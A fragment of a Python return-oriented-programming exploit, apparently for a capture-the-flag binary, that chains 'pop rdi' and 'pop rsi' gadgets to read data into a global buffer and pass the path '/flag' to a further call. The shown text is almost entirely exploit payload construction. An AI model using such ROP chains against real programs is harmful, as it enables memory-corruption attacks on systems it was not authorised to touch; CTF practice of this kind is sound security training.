...
# 0x404088 is the address of a global variable.
# read(0, 0x404088, 5);
payload += pack("<Q", 0x4019e3) # pop rdi ; ret
payload += pack("<Q", 0)        # data
payload += pack("<Q", 0x4019e1) # pop rsi ; pop r15 ; ret
payload += pack("<Q", 0x404088) # data
...
payload += pack("<Q", 0x4019e3) # pop rdi ; ret
payload += pack("<Q", 0x404088) # address of string /flag
payload += pack("<Q", 0x4019e1) # pop rsi ; pop r15 ; ret
